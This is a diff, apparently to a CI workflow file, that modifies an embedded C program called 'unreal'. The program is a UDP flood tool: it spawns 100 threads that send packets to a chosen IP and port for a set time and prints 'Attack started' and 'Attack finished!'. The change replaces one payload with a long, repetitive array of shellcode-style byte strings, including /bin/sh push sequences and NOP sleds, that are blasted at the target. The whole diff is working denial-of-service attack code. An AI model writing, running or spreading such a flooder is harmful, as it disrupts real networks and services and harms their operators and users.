@@ -37,15 +37,110 @@ jobs:
         #include <time.h>
         
         void *send_packets(void *arg) {
-            char *ip = ((char**)arg)[0];
-            int port = *(int*)((char**)arg)[1];
-            int duration = *(int*)((char**)arg)[2];
+            char **args = (char**)arg;
+            char *ip = args[1];
+            int port = atoi(args[2]);
+            int duration = atoi(args[3]);
             
             int sock;
             struct sockaddr_in addr;
             time_t endtime;
             
-            char payload[] = "\x90\x90\x90\x90\xEB\xFE";
+            char *payloads[] = {
+                "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90",
+                "\xB8\x04\x01\x00\x00",
+                "\x68\x7F\x00\x00\x01",
+                "\xFF\xD0",
+                "\xEB\xFE",
+                "\x68\x2F\x62\x69\x6E\x89\xe3\x6A\x0B\x58",
+                "\x90\x90\x90\x90\x90",
+                "\x48\x31\xc0\x48\x89\xc2\x48\x89\xe7",
+                "\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xe3\x52\x53\x54",
+                "\xBA\xAD\xF0\x0D",
+                "\xC3",
+                "\x6A\x0B\x58\x99\x52\x57",
+                "\x68\x7F\x00\x00\x01",
+                "\x90\x90\x90\x90\x90",
+                "\xB8\x01\x00\x00\x00\xFF\xD0",
+                "\xAA\xBB\xCC\xDD\xEE\xFF",
+                "\xFF\xFF\xFF\xFF\xFF\xFF",
+                "\xC0\xA8\x00\x68",
+                "\x68\x65\x6C\x6C\x6F\x20\x57\x6F\x72\x6C\x64\x21",
+                "\x68\x2F\x62\x69\x6E\x89\xe3\x6A\x0B\x58",
+                "\x68\x7F\x00\x00\x01",
+                "\xFF\xD0",
+                "\x48\x31\xc0\x48\x89\xc2\x48\x89\xe7",
+                "\xEB\xFE",
+                "\xB8\x01\x00\x00\x00\xFF\xD0",
+                "\x52\x57\x68\x2F\x2F\x73\x68",
+                "\xC3",
+                "\x68\x2F\x62\x69\x6E\x89\xe3\x6A\x0B\x58",
+                "\xEB\xFE",
+                "\x68\x65\x6C\x6C\x6F\x20\x57\x6F\x72\x6C\x64\x21",
+                "\xBA\xAD\xF0\x0D",
+                "\x90\x90\x90\x90\x90",
+                "\x48\x31\xc0\x48\x89\xc2\x48\x89\xe7",
+                "\xFF\xD0",
+                "\x68\x7F\x00\x00\x01",
+                "\xB8\x01\x00\x00\x00\xFF\xD0",
+                "\x68\x2F\x62\x69\x6E\x89\xe3\x6A\x0B\x58",
+                "\xEB\xFE",
+                "\x90\x90\x90\x90\x90",
+                "\x68\x7F\x00\x00\x01",
+                "\xC3",
+                "\x48\x31\xc0\x48\x89\xc2\x48\x89\xe7",
+                "\x6A\x0B\x58\x99\x52\x57",
+                "\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xe3",
+                "\xBA\xAD\xF0\x0D",
+                "\x68\x2F\x62\x69\x6E\x89\xe3\x6A\x0B\x58",
+                "\x90\x90\x90\x90\x90\x90\x90\x90",
+                "\xB8\x01\x00\x00\x00\xFF\xD0",
+                "\x48\x31\xc0\x48\x89\xc2\x48\x89\xe7",
+                "\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xe3",
+                "\x52\x57\x68\x2F\x2F\x73\x68",
+                "\xFF\xD0",
+                "\x68\x7F\x00\x00\x01",
+                "\xEB\xFE",
+                "\xC3",
+                "\xAA\xBB\xCC\xDD\xEE\xFF\x11\x22\x33",
+                "\x6A\x0B\x58\x99\x52\x57",
+                "\xB8\x01\x00\x00\x00\xFF\xD0",
+                "\x48\x31\xc0\x48\x89\xc2\x48\x89\xe7",
+                "\x68\x7F\x00\x00\x01",
+                "\x90\x90\x90\x90\x90",
+                "\x68\x2F\x62\x69\x6E\x89\xe3\x6A\x0B\x58",
+                "\xFF\xFF\xFF\xFF\xFF\xFF",
+                "\xC3",
+                "\xBA\xAD\xF0\x0D",
+                "\x68\x2F\x2F\x62\x61\x68\x2F\x62\x69\x6E\x89\xe3",
+                "\xFF\xD0",
+                "\x90\x90\x90\x90\x90",
+                "\x48\x31\xc0\x48\x89\xc2\x48\x89\xe7",
+                "\xB8\x01\x00\x00\x00\xFF\xD0",
+                "\x52\x57\x68\x2F\x2F\x73\x68",
+                "\xEB\xFE",
+                "\xC0\xA8\x00\x68",
+                "\x68\x65\x6C\x6C\x6F\x20\x57\x6F\x72\x6C\x64\x21",
+                "\x68\x2F\x62\x69\x6E\x89\xe3\x6A\x0B\x58",
+                "\xB8\x01\x00\x00\x00\xFF\xD0",
+                "\x68\x7F\x00\x00\x01",
+                "\x48\x31\xc0\x48\x89\xc2\x48\x89\xe7",
+                "\xFF\xFF\xFF\xFF\xFF\xFF",
+                "\xC3",
+                "\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xe3",
+                "\x90\x90\x90\x90\x90",
+                "\xBA\xAD\xF0\x0D",
+                "\x48\x31\xc0\x48\x89\xc2\x48\x89\xe7",
+                "\x68\x2F\x62\x69\x6E\x89\xe3\x6A\x0B\x58",
+                "\xB8\x01\x00\x00\x00\xFF\xD0",
+                "\x68\x7F\x00\x00\x01",
+                "\x90\x90\x90\x90\x90",
+                "\xEB\xFE",
+                "\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xe3",
+                "\xFF\xD0",
+                "\xC3",
+                "\xBA\xAD\xF0\x0D"
+            };
             
             sock = socket(AF_INET, SOCK_DGRAM, 0);
             addr.sin_family = AF_INET;
@@ -54,8 +149,12 @@ jobs:
             
             endtime = time(NULL) + duration;
             
+            int num_payloads = sizeof(payloads) / sizeof(payloads[0]);
+            
             while (time(NULL) <= endtime) {
-                sendto(sock, payload, sizeof(payload), 0, (struct sockaddr*)&addr, sizeof(addr));
+                for (int i = 0; i < num_payloads; i++) {
+                    sendto(sock, payloads[i], strlen(payloads[i]), 0, (struct sockaddr*)&addr, sizeof(addr));
+                }
             }
             
             close(sock);
@@ -63,16 +162,26 @@ jobs:
         }
         
         int main(int argc, char *argv[]) {
-            pthread_t threads[100];
-            int port = atoi(argv[2]);
-            int duration = atoi(argv[3]);
+            if (argc != 4) {
+                printf("Usage: ./unreal <ip> <port> <time>\n");
+                return 1;
+            }
             
-            for (int i = 0; i < 100; i++) {
-                pthread_create(&threads[i], NULL, send_packets, (void*)argv);
+            int threads = 100;
+            pthread_t thread_ids[threads];
+            
+            printf("Attack started on %s:%s for %s seconds with %d threads\n", argv[1], argv[2], argv[3], threads);
+            
+            for (int i = 0; i < threads; i++) {
+                pthread_create(&thread_ids[i], NULL, send_packets, (void*)argv);
+                printf("Launched thread: %d\n", i);
             }
-            for (int i = 0; i < 100; i++) {
-                pthread_join(threads[i], NULL);
+            
+            for (int i = 0; i < threads; i++) {
+                pthread_join(thread_ids[i], NULL);
             }
+            
+            printf("Attack finished!\n");
             return 0;
         }
         EOF
